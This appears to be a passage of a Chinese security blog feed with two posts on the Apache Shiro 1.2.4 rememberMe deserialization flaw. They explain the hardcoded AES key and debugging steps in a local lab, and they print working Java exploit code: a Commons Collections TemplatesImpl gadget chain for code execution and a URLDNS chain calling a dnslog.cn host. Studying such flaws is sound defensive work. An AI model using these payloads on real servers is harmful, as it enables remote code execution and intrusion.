java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> shiro.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shirotest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://tmp/classes/Testdemo.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, templates);</span><br><span class="line">        map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(templates);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldfactory</span> <span class="operator">=</span> cl.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        fieldfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldfactory.set(lazymap, invokerTransformer);</span><br><span class="line">        serialize(map2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;wer.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        System.out.println(<span class="string">&quot;1.序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地开启服务打一下payload：</p><img src="/2023/03/25/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93CC%E4%BE%9D%E8%B5%96/12.png" class><p>成功弹出计算器。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p> 反序列化之路任重而道远。</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro反序列化初探</title>
      <link href="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/"/>
      <url>/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="Apache-shiro简介"><a href="#Apache-shiro简介" class="headerlink" title="Apache shiro简介"></a>Apache shiro简介</h2><p>shiro是一种开源的java安全框架。它提供了身份验证（Authentication）、授权（Authorization）、加密（Cryptography）和会话管理（Session Management）等安全功能，用于保护Web应用程序和非Web应用程序中的安全性。可运行在web应用和非web应用中。使用Shiro框架可以使应用程序的安全性得到提高，同时也可以使开发者更加方便地进行身份验证、授权和会话管理等操作，减少了开发的复杂度和工作量。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>shiro框架提供了保持会话的功能，当用户勾选Remember Me并且登录成功后，服务端会返回一个字段名为rememberMe的Cookie字段，该字段将登录信息序列化，AES加密后base64编码作为rememberMe字段值返回给客户端。用户以后每次登录时携带此Cookie就可以免账号密码登录。由于AES是固定key加密，key是写死在源代码中的，（后面分析会讲）那么攻击者就可以将恶意代码序列化，AES加密并编码通过Cookie传递服务端达到恶意代码执行的目的。</p><p>影响版本：Apache Shiro &lt;&#x3D; 1.2.4</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Github上有现成的代码包，下载shiro-1.2.4源码：<a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4%EF%BC%8C%E5%8F%A6%E5%A4%96%E5%9C%A8pom.xml%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E6%B7%BB%E5%8A%A0%E6%AD%A4Maven%E4%BE%9D%E8%B5%96%E3%80%82">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4，另外在pom.xml配置文件中添加此Maven依赖。</a></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  ~ Licensed to the Apache Software Foundation (ASF) under one</span></span><br><span class="line"><span class="comment">  ~ or more contributor license agreements.  See the NOTICE file</span></span><br><span class="line"><span class="comment">  ~ distributed with this work for additional information</span></span><br><span class="line"><span class="comment">  ~ regarding copyright ownership.  The ASF licenses this file</span></span><br><span class="line"><span class="comment">  ~ to you under the Apache License, Version 2.0 (the</span></span><br><span class="line"><span class="comment">  ~ &quot;License&quot;); you may not use this file except in compliance</span></span><br><span class="line"><span class="comment">  ~ with the License.  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment">  ~</span></span><br><span class="line"><span class="comment">  ~     http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment">  ~</span></span><br><span class="line"><span class="comment">  ~ Unless required by applicable law or agreed to in writing,</span></span><br><span class="line"><span class="comment">  ~ software distributed under the License is distributed on an</span></span><br><span class="line"><span class="comment">  ~ &quot;AS IS&quot; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY</span></span><br><span class="line"><span class="comment">  ~ KIND, either express or implied.  See the License for the</span></span><br><span class="line"><span class="comment">  ~ specific language governing permissions and limitations</span></span><br><span class="line"><span class="comment">  ~ under the License.</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--suppress osmorcNonOsgiMavenDependency --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro.samples<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-samples<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>&gt;</span>../pom.xml<span class="tag">&lt;/<span class="name">relativePath</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>samples-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Apache Shiro :: Samples :: Web<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">forkMode</span>&gt;</span>never<span class="tag">&lt;/<span class="name">forkMode</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mortbay.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jetty-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jetty.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">contextPath</span>&gt;</span>/<span class="tag">&lt;/<span class="name">contextPath</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">connectors</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">connector</span> <span class="attr">implementation</span>=<span class="string">&quot;org.mortbay.jetty.nio.SelectChannelConnector&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">port</span>&gt;</span>9080<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">maxIdleTime</span>&gt;</span>60000<span class="tag">&lt;/<span class="name">maxIdleTime</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">connector</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">connectors</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">requestLog</span> <span class="attr">implementation</span>=<span class="string">&quot;org.mortbay.jetty.NCSARequestLog&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">filename</span>&gt;</span>./target/yyyy_mm_dd.request.log<span class="tag">&lt;/<span class="name">filename</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">retainDays</span>&gt;</span>90<span class="tag">&lt;/<span class="name">retainDays</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">append</span>&gt;</span>true<span class="tag">&lt;/<span class="name">append</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">extended</span>&gt;</span>false<span class="tag">&lt;/<span class="name">extended</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">logTimeZone</span>&gt;</span>GMT<span class="tag">&lt;/<span class="name">logTimeZone</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">requestLog</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        &lt;dependency&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--            &lt;artifactId&gt;jstl&lt;/artifactId&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--            &lt;scope&gt;runtime&lt;/scope&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        &lt;/dependency&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--            &lt;scope&gt;provided&lt;/scope&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.sourceforge.htmlunit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>htmlunit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--            &lt;scope&gt;test&lt;/scope&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mortbay.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jetty<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jetty.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mortbay.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsp-2.1-jetty<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jetty.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jcl-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--  这里需要将jstl设置为1.2 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        &lt;dependency&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--            &lt;version&gt;4.0&lt;/version&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        &lt;/dependency&gt;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用idea打开\shiro-shiro-root-1.2.4\samples\web，配置tomcat服务器，在这就不说了。直接运行，启动shiro的web站点。</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/1.png" class><p>游览器访问8080端口，</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/2.png" class><p>环境搭建成功。</p><h2 id="shiro加密流程分析"><a href="#shiro加密流程分析" class="headerlink" title="shiro加密流程分析"></a>shiro加密流程分析</h2><p>在没登陆之前：</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/3.png" class><p>Cookie中是没有rememberMe字段的，抓包登录进去，勾选Remember Me选项。</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/4.png" class><p>返回一个set-Cookie字段，这个字段就是序列化字符串AES和base64加密后的结果。漏洞点也就在这个字段。</p><p>我们可以在AbstractRememberMeManager类的onSuccessfulLogin方法里下个断点，这个方法会在用户登录成功后调用。在if判断里下个断点，这个是判断是否勾选Remember Me字段的。如果是，就调用rememberIdentity方法，如果不是，就返回debug信息。调试一下。</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/5.png" class><p>这里判断true，进入到rememberIdentity方法，</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/6.png" class><p>getIdentityToRemember方法返回用户登录信息，接着进入rememberIdentity方法，</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/7.png" class><p>跟进convertPrincipalsToBytes方法，它返回的是一个bytes数组，步入。</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/8.png" class><p>首先对用户的登录信息序列化，然后利用encrypt函数对其进行加密，加密具体细节不再展示，是AES加密，感兴趣的小伙伴可以自己跟一下。加密完成后返回，继续调用rememberSerializedIdentity方法，</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/9.png" class><p>在这个方法中对加密后的字节数组流base64编码，然后将它设置在Cookie里返回给客户端，前面抓包看到返回包中的Cookie就是这么形成的了。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>既然能设置Cookie，那么也能读取Cookie。读取Cookie的方法就是getRememberedSerializedIdentity，从客户端读取Cookie并且base64解码，看看谁调用了，往上找。</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/10.png" class><p>在父类的getRememberedPrincipals方法中调用了它。这里的bytes就是加密后的字节流，过了判断之后就进入if调用convertBytesToPrincipals方法，跟进。</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/11.png" class><p>先解密，然后调用反序列化函数，这个反序列化函数就不跟了，直接看decrypt函数。</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/12.png" class><p>这里就调用cipherService.decrypt解密了。encrypted是密文，而getDecryptionCipherKey()返回key，开头讲到过，key是写死 在源代码中的，看能不能找到。跟进这个方法。</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/13.png" class><p>返回一个属性，看一下这个属性是在哪赋值的。</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/14.png" class><p>继续往上找，</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/15.png" class><p>还是查找用法。</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/16.png" class><p>最后会在构造函数中调用此方法，</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/17.png" class><p>这个就是AES加密的key了。在shiro-1.2.4版本中，关于rememberMe加密的，key已知并且固定，就可以恶意构造Cookie来打一些CC的依赖进而RCE。而关于shiro反序列化来RCE的链子在下篇文章中说明，在此埋下伏笔。这篇文章就用URLDNS链来验证反序列化是否行得通。</p><p>URLDNS链的EXP：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">payload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        System.out.println(<span class="string">&quot;1.序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt;hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://qyoubz.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefiled</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefiled.set(url,<span class="number">1234</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">        hashcodefiled.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    